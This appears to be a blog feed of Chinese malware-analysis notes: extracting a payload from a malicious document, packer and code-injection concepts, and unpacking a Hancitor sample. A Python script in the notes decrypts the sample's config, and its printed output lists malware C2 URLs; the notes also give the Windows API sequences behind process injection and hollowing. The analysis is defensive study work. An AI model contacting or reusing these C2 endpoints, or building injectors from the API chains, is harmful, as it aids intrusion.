title="image">​<p>所以程序执行了这个winword.exe，而这个程序的二进制数据保存在Macros/UserForm1/o(11)中</p><p>先将其数据保存下来</p><p>‍</p><img src="/2023/03/17/MDA1/image-20230317162713-ro58dbg.png" class="" title="image">​<img src="/2023/03/17/MDA1/image-20230317162822-uofcui8.png" class="" title="image">​<p>将里面的Tahoma去掉，然后写脚本拼接即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./1233.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">data_array = c.split(<span class="string">&quot;!&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">data_array = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> data_array]</span><br><span class="line"></span><br><span class="line">data_array_bytes = <span class="built_in">bytes</span>(data_array)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;download.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) </span><br><span class="line">f.write(data_array_bytes)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Write Success!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>‍</p><img src="/2023/03/17/MDA1/image-20230317163612-ewravup.png" class="" title="image">​<img src="/2023/03/17/MDA1/image-20230317165441-xm3kb47.png" class="" title="image">​<img src="/2023/03/17/MDA1/image-20230317165736-f2c5udg.png" class="" title="image">​<img src="/2023/03/17/MDA1/image-20230317170034-y72j4pf.png" class="" title="image">​<p>可以通过动态调试更容易的从DOCX文件中提取数据。打开的时候，VBS是加密的，用记事本打开，将DPB改为DPX即可</p><img src="/2023/03/17/MDA1/image-20230317182128-ma392e0.png" class="" title="image">​<img src="/2023/03/17/MDA1/image-20230317182050-gt8do7z.png" class="" title="image">​<img src="/2023/03/17/MDA1/image-20230317182215-pvuqvud.png" class="" title="image">​]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MalwareAnalysis </tag>
            
            <tag> 恶意文档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MAS系列1</title>
      <link href="/2023/03/16/MAS%E7%B3%BB%E5%88%971/"/>
      <url>/2023/03/16/MAS%E7%B3%BB%E5%88%971/</url>
      
        <content type="html"><![CDATA[<p>MAS系列网址：<a href="https://exploitreversing.com/">https://exploitreversing.com/</a></p><p>分析样本哈希（SHA256）：8ff43b6ddf6243bd5ee073f9987920fa223809f589d151d7e438fd8cc08ce292</p><p>‍</p><h1 id="脱壳相关概念"><a href="#脱壳相关概念" class="headerlink" title="脱壳相关概念"></a>脱壳相关概念</h1><p><strong>加壳的动机</strong></p><ol><li>便于逃避AV的检测</li><li>由于需要规避许多反分析技术（反调试器和反vm技巧），因此很难对其进行动态脱壳</li><li>整个恶意软件或只有脱壳的代码可是多态的</li></ol><p>大多数恶意软件使用自定义的壳，使代码在安全防御监控下无法检测到。另外还有一些特殊的加壳程序（也称为保护程序），例如Themida，Arxan, VMProtect, Agile.NET和许多其他的会虚拟化指令并实施各种反取证和混淆技术的加壳程序，<strong>下面是他们的一些特征</strong></p><ul><li>已用于64位二进制文件</li><li>IAT被去除或者最多导入一个函数</li><li>大多数字符串被加密</li><li>内存完整性受到检查和保护，因此无法从内存中dump出原始原始程序，因为原始指令并没有解码</li><li>指令被虚拟化，并且有的转换为RISC指令</li><li>虚拟指令在内存中被加密</li><li>使用基于堆栈的混淆，使用静态的方法处理虚拟化指令是非常困难的</li><li>大多数虚拟指令是多态的，因此有许多虚拟指令引用同一原始指令</li><li>有非常多假的push指令，当然，其中包含许多死代码（dead code）和无用代码（useless code）。</li><li>这些保护程序使用无条件跳转实现代码重新排序</li><li>所有的这些现在的加壳器使用代码平坦化，许多反调试技术，和反虚拟机技术</li><li>并非所有 x64 指令都是虚拟化的，因此会发现包含虚拟化和非虚拟化（原生）指令混合的二进制代码</li><li>大多数时候，函数的序言（prologues）和尾部（epilogues）并没有虚拟化。</li><li>原始代码段（code section）可以被拆分或分散在程序中，所以指令和数据可能会混合在一起。</li><li>引用导入函数的指令可能会被清零或被NOP替换，这种情况下，这些引用会动态恢复。有时相同的引用不会被清零，而是替换为使用 RVA 跳转到相同导入地址的跳转指令，正如有名的“IAT 混淆”。</li><li>在 shellcode 和常见的恶意软件中使用的 API 是经过 hash 处理的。</li><li>从原生寄存器（native register）到虚拟寄存器（virtualized register）的转换通常是一对一的，但也并非总是如此。此外，还有一个上下文切换组件，负责将寄存器和标志信息转移到虚拟机上下文。</li><li>虚拟机处理函数（handlers）来自数据段</li><li>许多原生（native）API 被重定向到桩代码（stub code）来转发函数调用</li><li>例如常量展开（constant unfolding）、基于模式的混淆（pattern-based obfuscation）、间接跳转（control indirection）、内联函数（inline function）、代码重用（code duplication）以及不透明谓词（opaque predicate）等混淆被经常使用。</li></ul><p><strong>在脱壳之前或脱壳时，我们可以观察并考虑以下问题：</strong></p><ul><li>恶意软件真的加壳了吗</li><li>加壳的证据</li><li>恶意软件是否执行了自我注入或者远程注入</li><li>恶意软件是否执行了自我覆盖</li><li>Payload被写在哪里</li><li>Payload如何被执行</li><li>怎么证明脱壳完毕</li><li>是否存在多层加壳</li></ul><p><strong>我们如何知道恶意软件是否真的加壳？</strong>有2，3个点可以证明这件事情</p><ul><li>二进制样本只有几个导入的DLL和函数</li><li>有许多混淆的字符串</li><li>存在特殊的系统调用</li><li>非标准 段名字</li><li>没有通用的可执行段（只有.text/.code段可以被执行）</li><li>额外的可写段</li><li>高熵（High entropy）段（高于7.0，但只能作为一个弱指标）</li><li>段的原始大小和虚拟大小存在实质性的差异</li><li>大小为0的段</li><li>没有与网络通信的相关API</li><li>缺少恶意软件功能的必要API（比如勒索软件中的Crypt*函数）</li><li>不寻常的文件格式和文件头</li><li>程序入口点执行其他的段，而不是.text/.code段</li><li>特别大的资源端被LoadResource()加载</li><li>多层加壳的出现</li><li>在IDA Pro上打开后在彩条上看到大量的数据或者未探索的代码</li></ul><p>仅仅出现1个并不能确定加壳，出现多个就基本上可以确定加壳了，此外，<strong>还有一些其他的因素可以考虑</strong></p><ul><li>大多数样本使用LoadLibrary() 和GetProcAddress()动态解析API（反射性代码注入除外）</li><li>网络APIS也可能被动态解析</li><li>在第一次分析时很难检测到不正确的标头</li><li>大的资源段可能不是壳，因为其可能仅包含GUI控件或者数字证书</li><li>可能会混合使用加密/混淆字符串和明文，因此很难确定二进制文件是否加壳</li></ul><p><strong>使用调试器脱壳可能有一系列需要理解和绕过的挑战</strong></p><ul><li>反调试技术（时间检查【time checking】、CPUID、堆检查【heap checking】、调试标志位检查【debugging flag checking】、NtSetInformationThread()等），所以推荐在 x64dbg/x32dbg 使用 <a href="https://github.com/x64dbg/ScyllaHide">ScyllaHide</a> 等反调试插件。</li><li>反虚拟机技术用于检查 VMware，VirtualBox，Hyper-V 和 Qemu 工件。</li><li>文件名，主机名以及用户检查（避免使用哈希作为文件名）。</li><li>虚拟机上可用磁盘大小（推荐至少 100 GB）。</li><li>虚拟机上的处理器数量（两个或更多）。</li><li>正常运行时间（尝试保持正常运行时间超过20分钟）</li><li>许多无意义的调用（不会使用返回结果）和不存在的 API（假 API）。</li><li>异常处理被用于反调试。</li><li>软件断点被清除以及寄存器（DR#）被操控（反断点技术）。</li><li>使用经典算法（crc32，conti，add_ror13…）的哈希函数。</li><li>Process Hacker、Process Explorer、Process Monitor 等知名工具的检查（建议在使用前重命名这些可执行文件）。</li></ul><p>不幸的是，反虚拟机技术和反调试技术不可能总被插件处理，我们必须设法使用调试器绕过。在这种情况下，我们可以使用 WinDbg 等不同的调试器来调试恶意软件（这些恶意软件只针对 ring3 调试器，不针对内核调试器，如 <strong>GuLoader ​</strong>恶意软件）。</p><p>‍</p><p>在脱壳后，我们也可能需要修复生成的二进制文件，因为可能存在以下问题</p><ul><li>DOS/PE头可能已在内存中破坏或者被压缩库修改</li><li>许多情况下，当从内存中提取二进制文件时，需要清理它，因为在它的 DOS 头（MZ 签名）和 PE 头之前有一些垃圾字节</li><li>入口点（Entry-Point，EP）可能被清零或错误。</li><li>脱壳后二进制文件的导入表可能被破坏，因为内存被转储为文件，但其地址指的是虚拟地址（映射版本而非未映射版本），因此显示的地址为未对齐段或不存在的段。</li><li>基地址是错误的</li><li>PE格式的字段存在一些不一致</li><li>可能很难确定原始入口点（Original Entry Point，OEP），它通常使用间接调用（如call [eax]或jmp [eax]）完成脱壳器代码到原代码的转换。另外，未解析 API 的存在可能是恶意代码尚未到达 OEP 的证据。注意：OEP 是可执行文件在加壳之前的入口点，在加壳之后，一个新的 EP 与加壳器相关联</li><li>互斥锁（mutexes）被用于两层脱壳器之间的一个“解锁密钥”。这种情况下，在没有第一阶段发生的情况下第二阶段的脱壳是不会发生的，如果发生了，则证明互斥锁的存在。</li><li>代码可能执行自我覆盖</li><li>脱壳代码的第一阶段不会从任意目录运行，只能从特定目录运行。</li><li>你可以提取诱饵二进制文件（decoy binary），在许多案例中，恶意软件开发者会打包一个或多个无用的可执行文件作为诱饵，以此来消耗分析人员的时间，因此，明智的做法是不要相信第一次就从内存中得到了脱壳后正确的二进制文件</li></ul><p>下面是一些解决这些问题的办法：</p><ul><li>从另一个可执行文件（或从样本自身）复制一个完整的 PE 头，并考虑脱壳后的二进制文件是未映射（.text 段通常从 0x400 开始）还是映射的（.text 段通常从 0x1000 开始）。</li><li>通过修改相应的原始地址（Raw Address）和原始大小（Raw Size）来对齐脱壳后二进制文件的段，此操作通常会修复导入表，并且可能会查看到导入函数。需要注意：一些脱壳后的二进制文件在对齐它们的段之前是不会显示导入表的。然而，还有一些恶意软件在你脱壳之后导入表依旧没有任何函数，这并不意味你的脱壳过程出错，而是可能使用了动态解析 API 的技术。</li><li>重建 IAT 并强制修改 OEP。</li><li>如果在查找 OEP 时遇到了问题，请记住 OEP 可能在 IAT 解析之后出现。这种情况下，一种可能的方法是检查 IAT 是否已解析（检查 x64dbg 上的模块间调用）或在恶意软件执行时的关键 API 上设置断点（例如勒索软件使用的CryptoAcquireContext()），因为当执行到这些关键 API 时，IAT 肯定已经完成了解析，然后寻找无条件跳转到特定内存或间接调用（如call [eax]）。另一种有趣的方法是使用调试器的图形可视化功能（x64dbg 中的 g），并在最后的代码块检查这些转换点（间接调用或内存地址的无条件跳转）</li><li>调整基地址以匹配从内存转储的段基地址</li><li>为了检测执行自我覆盖的恶意软件，可以尝试在 .text/.code 段设置断点，这样可以在代码段被写或执行时触发断点。</li><li>在两阶段脱壳情况下，第一个脱壳得到的二进制文件可能是 DLL，根据上下文将 DLL 文件转换为可执行文件可能很有用，并且有很多方法可以完成此任务，但我最喜欢的方法是编辑 PE 头以更改Characteristics 字段，并将导出函数的入口作为程序入口。</li></ul><p>‍</p><h1 id="代码注入技术回顾"><a href="#代码注入技术回顾" class="headerlink" title="代码注入技术回顾"></a>代码注入技术回顾</h1><p>主要的代码技术有以下几种</p><ul><li>DLL 注入:  这个老的技术用来强制一个进程加载一个DLL， 主要涉及到的APIs： <code>OpenProcess()</code>​, <code>VirtualAllocEx()</code>​,<code>WriteProcessMemory()</code>​,<code>CreateRemoteThread | NtCreateThread | RtlCreateUserThread</code>​</li><li>PE 注入:  在这种技术中，编写恶意代码强制在远进程或自我进程中（自我注入）执行，<code>OpenThread()</code>​,<code>SuspendThread()</code>​,<code>VirtualAllocEx()</code>​,<code>WriteProcessMemory()</code>​,<code>SetThreadContext()</code>​,<code>ResumeThread() | NtResumeThread()</code>​。</li><li>Reflective<a href=""> </a>Injection</li><li>APC Injection</li><li>Process Hollowing: 简而言之，该技术被恶意软件用来 ”挖空”进程的全部内容，并在其中插入恶意内容。包含的APIs有：<code>CreateProcess()</code>​, <code>NtQueryProcessInfomation</code>​, <code>GetModuleHandle()</code>​, <code>Zw/NtUnmapViewOfSection()</code>​,<code>VirtualAllocEx()</code>​,<code>WriteProcessMemory()</code>​, <code>GetThreadContext()</code>​</li><li>AtomBombing</li><li>Process Doppelgänging</li><li>Process Herpaderping</li><li>Hooking Injection</li><li>Extra Windows Memory Injection</li><li>Propagate Injection</li></ul><p><strong>（没写详细的就是遗忘的或者没接触过的，之后再补</strong></p><p>​                </p><h1 id="脱壳方法"><a href="#脱壳方法" class="headerlink" title="脱壳方法"></a>脱壳方法</h1><p>脱壳的分类非常复杂，这部分主要讲述脱壳技术，但是一般来说，有一些方法能够对恶意软件进行脱壳，例如使用调试器、自动化工具、Web服务或者编写自己的脱壳代码，具体使用哪种方法根据情况而定​</p><h2 id="调试器-特定函数断点脱壳"><a href="#调试器-特定函数断点脱壳" class="headerlink" title="调试器 + 特定函数断点脱壳"></a>调试器 + 特定函数断点脱壳</h2><p>这是使用最多的方法是，包括将恶意软件加载到调试器中，并在众所周知的API上设置软件断点，其中大多数与内存管理和操作有关，并查找要从内存中提取的可执行文件和ShellCode,在以下API上插入软件断点:</p><ul><li>CreateProcessInternalW()</li><li>VirtualAlloc() | VirtualAllocEx()</li><li>VirtualProtect() | ZwProtectVirtualMemory()</li><li>WriteProcessMemory() | NtWriteProcessMemory()</li><li>ResumeThread() | NtResumeThread()</li><li>CryptDecrypt() | RtlDecompressBuffer()</li><li>NtCreateSection() + MapViewOfSection() | ZwMapViewOfSection()</li><li>UnmapViewOfSection() | ZwUnmapViewOfSection()</li><li>NtWriteVirtualMemory()</li><li>NtReadVirtualMemory()</li></ul><p>脱壳过程中，我们可能会遇到一些问题（例如，恶意软件使用了反调试技术）和其他困难。因此，下面有一些在脱壳前和脱壳后需要注意的：</p><ul><li>在恶意软件到达其入口点后设置断点（系统断点后）</li><li>如前所述，建议使用反调试插件，并在少数情况下忽略从 0x00000000 到 0xFFFFFFFF 范围的所有异常</li><li>有时忽略异常可能不是一个好主意，因为恶意软件可能使用异常来脱壳，另外，还存在使用中断和异常调用 API 的恶意软件（本文之外）</li><li>使用 MSDN 了解列出的 API 以及参数是成功脱壳恶意软件的关键。</li><li>如果使用VirtualAlloc()，建议在其退出时（ret 10）设置断点，此外，有时通过设置写内存断点更容易跟踪分配的内容。</li><li>某些情况下，恶意软件将 payload 提取到内存中，但它会破坏 PE 头，因此需要使用 HxD 等十六进制编辑器重建整个 PE 头</li><li>提取的 payload 可能采用映射或未映射的格式。如果是映射格式，那可能导入表是损坏的，需要通过 PEBear 手动对齐段，或者使用 pe_unmapper 之类的工具进行修复，可能还需要修复基地址和入口点。</li><li>要重建损坏的 IAT，建议使用 Scylla（内嵌在 x64dbg），但需要输入 OEP，找到 OEP 的方法之一是查找代码转换的指令（如jmp eax，call eax，call [eax]等）。</li><li>一些脱壳后的恶意软件在 IAT 中没有任何函数，所以有两种可能：段未对齐（映射版本）或是脱壳后的恶意软件有动态解析函数的功能。</li><li>在 x64dbg 上使用 g 键可能有助于在块中可视化代码，并找到可能的 OEP。</li><li>查找 OEP 的另一个方法是通过 <a href="https://www.intel.com/content/www/us/en/developer/articles/tool/pin-a-dynamic-binary-instrumentation-tool.html">PIN</a> 等代码跟踪工具。</li><li><a href="https://github.com/hasherezade/tiny_tracer">tiny_tracer</a> 之类借助 PIN 的工具可以更轻松地检测，并且可用于了解恶意软件调用的函数（对于脱壳和了解反分析技术非常有用），还能寻找可能的 OEP。</li><li>在许多情况下，脱壳后的代码可能是恶意软件的第一阶段，因此，有必要重复步骤来对下一阶段脱壳。</li><li>一些恶意软件样本执行自我覆盖，因此可以在 .text 段设置断点来检测脱壳的执行。</li><li>根据提取的二进制文件（如 shellcode），它可能需要特定的上下文环境才能运行，因此有必要将其注入正在运行的进程（如 explorer.exe）中执行进一步的分析。</li><li>如何检查提取的文件是否是最终的恶意软件？这里没有一个准确的答案，通过从 DLL 如 WS2_32.dll（Winsock）和 Wininet.dll 查找网络函数，明文字符串，加密函数（主要是勒索软件），以及其他证据来判断。在重新对齐段或修复 IAT 之后，可以将提取到的代码加载到 IDA Pro 进行分析。</li></ul><h2 id="调试器-DLL加载时断点"><a href="#调试器-DLL加载时断点" class="headerlink" title="调试器 + DLL加载时断点"></a>调试器 + DLL加载时断点</h2><p>这是一种古老且简单的恶意软件脱壳技术，方法是在每个加载的 DLL 时停止调试器并检查内存中可能提取的 PE 格式文件的内存（注意：不要只关注 RWX 段，因为许多恶意软件会在 RW 段，并且在将执行上下文传递到可执行文件前，会通过VirtualProtect()将段的权限更改为 RWX）。毫无疑问，虽然会消耗一些时间，但大多数情况下十分有效。x64dbg 有配置选项中可以设置每个 DLL 加载时命中断点（Options =&gt; Debugging Options =&gt; Events =&gt; DLL load）。</p><h2 id="自动脱壳"><a href="#自动脱壳" class="headerlink" title="自动脱壳"></a>自动脱壳</h2><p>恶意软件分析人员可以使用自动化工具完成脱壳，Aleksandra Doniec (Hasherezade) 提供了出色的工具来实现这一目标：</p><ul><li>hollows-hunter：<a href="https://github.com/hasherezade/hollows_hunter/releases">https://github.com/hasherezade/hollows_hunter/releases</a></li><li>pe-sieve：<a href="https://github.com/hasherezade/pe-sieve/releases">https://github.com/hasherezade/pe-sieve/releases</a></li><li>mal_unpack：<a href="https://github.com/hasherezade/mal_unpack/releases">https://github.com/hasherezade/mal_unpack/releases</a></li></ul><h2 id="使用Process-Hacker"><a href="#使用Process-Hacker" class="headerlink" title="使用Process Hacker"></a>使用Process Hacker</h2><p>另一种从内存中提取二进制文件的简单（且有局限性）方法是通过 Process Hacker，方法是双击正在运行的进程，转到 Memory 选项，查找感兴趣的区域或基地址（RWX），双击并保存。当然，在自我注入的情况下更容易找到恶意二进制文件或 payload。但远程注入的情况下，需要逆向恶意程序来了解要注入的目标进程，诸如 explorer.exe 或 svchost.exe 等目标。重申一次，这是一种简单且有限的方法。</p><h2 id="使用公开或付费的服务"><a href="#使用公开或付费的服务" class="headerlink" title="使用公开或付费的服务"></a>使用公开或付费的服务</h2><p>你可以使用互联网上的服务 <a href="https://www.unpac.me/#/">Unpacme</a>，它提供自动脱壳服务，有一个免费的公共计划（每月 10 次）和其他付费计划。此外，它还提供了一个 API（<a href="https://api.unpac.me/">https://api.unpac.me/</a>）来将你的自定义程序与 Unpacme 服务连接</p><h2 id="写脱壳代码"><a href="#写脱壳代码" class="headerlink" title="写脱壳代码"></a>写脱壳代码</h2><p>尽管这种方法听起来比较耗时，通常可以使用 Python 完成脱壳，主要是在 shellcode 或 处理恶意软件线程使用多种反虚拟机和反调试的情况中。此外，在处理类似恶意软件时，还具有自动脱壳的优势。</p><h1 id="二进制脱壳"><a href="#二进制脱壳" class="headerlink" title="二进制脱壳"></a>二进制脱壳</h1><p>分析样本： 8ff43b6ddf6243bd5ee073f9987920fa223809f589d151d7e438fd8cc08ce292</p><p>首先使用PEBear进行检查，可能有助于收集第一批有价值的信息</p><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230314170731-icaevcl.png" class="" title="image"><p>发现在IAT中并没有关于网络通信，加解密的API，所以猜测加壳了。</p><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230314171209-6ms7pyb.png" class="" title="image"><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230314171347-mopivp5.png" class="" title="image"><p>.data段的VirtualSize远远大于RawSize，而且这个段的属性是可写的，这是另一个加壳的标记。</p><p>开始脱壳，在下面这些经典函数处下断点</p><ul><li>VirtualAlloc</li><li>VirtualProtect</li><li>ResumeThread</li></ul><p>经过几次CTRL + F9，观察VirtualAlloc分配的内存处的数据，发现了M8Z，这是一个aPLib压缩，直接dump下来</p><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230314172413-hjrly1r.png" class="" title="image"><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230314172730-x4jp393.png" class="" title="image"><p>搜索MZ头，发现已经解压缩完了，然后将MZ之前的去掉，拖到CFF Explorer里</p><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230314172850-iw2w4ky.png" class="" title="image"><p>可以看到很多加解密的函数，以及网络通信的函数，到这里位置，第一步的Unpack就结束了</p><h1 id="逆向解密代码"><a href="#逆向解密代码" class="headerlink" title="逆向解密代码"></a>逆向解密代码</h1><p>现在我们有了解压缩的二进制文件，所以让我们在IDA Pro中打开它。有很多方法可以找到加密配置，但更简单(而且有点不准确)的方法之一是在IDA Pro上查找处理数据的函数或Unexplored 颜色条区域(实际上，未探索的区域比下面所示的要大得多)：</p><p>‍</p><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230315122705-ptfadny.png" class="" title="image"><ul><li>byte_10004000</li><li>byte_10004010</li><li>byte_10004018</li></ul><p>根据我分析恶意软件的经验，我已经知道4010这块局域的8字节是Microsoft Crypto API中几个API的重要依据，因此这表明我们分析对了，在许多著名的恶意软件样本中发现的另一种模式是struct key + encrypted data，所以即使我没有关于这种情况的任何进一步指示，我也可以假设“byte_10004010”是某个密钥（长度为 8 字节），尽管 有时它不是最终密钥，因为恶意威胁使用 KDF（Key Derivation Functions）从提供的密码生成最终密钥。 根据我们的分析，“unk10004018”指的是可能加密的数据。</p><p>这些都只是猜测，只有去分析过之后，才会对这个位置的数据有一个更好的了解。</p><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230316160533-a0cb0c5.png" class="" title="image"><p>来到交叉引用的函数的位置</p><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230316160855-z1zk28j.png" class="" title="image"><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230316160841-ogvzk8e.png" class="" title="image"><p>尽管<code>CryptAcquireContextA()</code>​是一个被遗弃的函数，但他仍然被恶意软件威胁广泛使用。此API用于通过CSP（加密服务提供程序）获取密钥容器的句柄，它使用默认的密钥容器名称和用户默认的提供程序，因为这两个参数都为零，看第5个参数，0XF0000000指的是 <code>CRYPTO_VERIFYCONTEXT</code>​ ，这在使用临时密钥或不需要访问永久私钥的应用程序中很常见。这个恶意样本正在使用密钥派生。</p><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230316164912-na84k9c.png" class="" title="image">​<p>所以加密的步骤为</p><ol><li>byte_10004010 = C58B00157F8E9288</li><li>byte_10004010 –&gt;SHA1(20bytes)</li><li>SHA1 → CryptHashData( ) → CryptDeriveKey( ) → RC4 key (5 bytes)</li></ol><p>写解密代码解密数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_data</span>(<span class="params">filename</span>):</span></span><br><span class="line">    pe = pefile.PE(filename)</span><br><span class="line">    <span class="keyword">for</span> section <span class="keyword">in</span> pe.sections:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;.data&quot;</span> <span class="keyword">in</span> section.Name.decode(encoding=<span class="string">&quot;utf-8&quot;</span>).strip():</span><br><span class="line">            <span class="keyword">return</span> section.get_data(section.VirtualAddress, section.SizeOfRawData)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">data_decryptor</span>(<span class="params">rc4key, encrypt_config</span>):</span></span><br><span class="line">    rc4_cipher = ARC4.new(rc4key)</span><br><span class="line">    decrypted_config = rc4_cipher.decrypt(encrypt_config)</span><br><span class="line">    <span class="keyword">return</span> decrypted_config</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    file_name = <span class="string">&#x27;./_004B0000.mem&#x27;</span></span><br><span class="line">    datasec = extract_data(file_name)</span><br><span class="line">    datasec2 = datasec[<span class="number">16</span>:]</span><br><span class="line">    key = datasec2[:<span class="number">8</span>]  <span class="comment"># KEY</span></span><br><span class="line">    encrypted_data = datasec2[<span class="number">8</span>:<span class="number">256</span>]</span><br><span class="line">    hashed_key = SHA.new(key).hexdigest()</span><br><span class="line"></span><br><span class="line">    true_key = hashed_key[:<span class="number">10</span>]</span><br><span class="line">    dec_data = data_decryptor(binascii.unhexlify(true_key), encrypted_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密数据如下: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(dec_data.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密数据如下: </span></span><br><span class="line"><span class="comment"># 1910_nswhttp://newnucapi.com/8/forum.php|http://gintlyba.ru/8/forum.php|http://stralonz.ru/8/forum.php|</span></span><br></pre></td></tr></table></figure><p>我们设法从unpack的Hancitor二进制文件中提取并解密了Hanitor C2配置。编写解密器脚本的优点是，我们可以对所有遵循二进制模式的Hanctors样本使用它</p><p>使用malwoverview去查找一些其他的Hancitor样本。</p><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230316181504-kp3ny7c.png" class="" title="image">​<p>随便找一个下载下来，利用相似的方式脱壳，即在VirtualAlloc上下断点</p><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230316181551-ds6iygg.png" class="" title="image">​<p>发现这里有MZ头，dump下来后，去除前面那部分，然后打开IDA</p><p>‍</p><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230316181718-alwypnl.png" class="" title="image">​<p>发现是相同的结构，用之前的脚本提取下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解密数据如下: </span><br><span class="line"><span class="number">2103</span>_punoshhttp:<span class="comment">//nanogeelr.com/9/forum.php|http://ockpitehou.ru/9/forum.php|http://lumentsawfu.ru/9/forum.php|</span></span><br></pre></td></tr></table></figure><p>发现解密成功，然后好奇用bindiff对比以下上面2个样本unpack后的样本</p><p>‍</p><img src="/2023/03/16/MAS%E7%B3%BB%E5%88%971/image-20230316182234-7hctgg4.png" class="" title="image">​<p>发现基本一模一样,另外解密过程也可以用网站</p><p><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p><p>‍</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在这一篇文章中，我展示了如何通过编写Python3脚本从Hancitor样本中提取和解密C2数据，此外我还介绍了一些概念和基础，如代码注入和脱壳，这些概念和基础将在本系列的下一篇文章中有用。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MalwareAnalysis </tag>
            
            <tag> 进程注入 </tag>
            
            <tag> 脱壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Mastering Malware Analysis》第五章</title>
      <link href="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/"/>
      <url>/2023/03/03/Mastering_Malware_Analysis_Chapter_5/</url>
      
        <content type="html"><![CDATA[<p>Mastering Malware Analysis  Chapter 5</p><p>Inspecting Process Injection and API Hooking</p><p>我们将深入研究各种进程注入技术，包括DLL注入和傀儡进程(Stuxnet引入的一种先进技术)，并解释如何处理它们。然后将学习API hook, IAT hook和其他的hook技术</p><p>您将学习如何分析其他进程中注入的代码，通过内存取证检测它，检测不同类型的API钩子技术，并分析它们以检测**Man-in-the-Browser(MiTB)**攻击</p><p>为了使学习无缝衔接，这个章节被划分为下面几个主要的部分</p><ol><li>理解进程注入</li><li>DLL注入</li><li>深挖进程注入</li><li>代码注入的动态分析</li><li>针对进程注入的内存取证技术</li><li>理解API hook</li><li>探索IAT hook</li></ol><h1 id="理解进程注入"><a href="#理解进程注入" class="headerlink" title="理解进程注入"></a>理解进程注入</h1><h2 id="什么是进程注入"><a href="#什么是进程注入" class="headerlink" title="什么是进程注入?"></a>什么是进程注入?</h2><p>进程注入是一组技术，允许您将代码块或整个动态链接库(dll)注入到另一个进程的内存中，并执行该代码。</p><p>在Windows 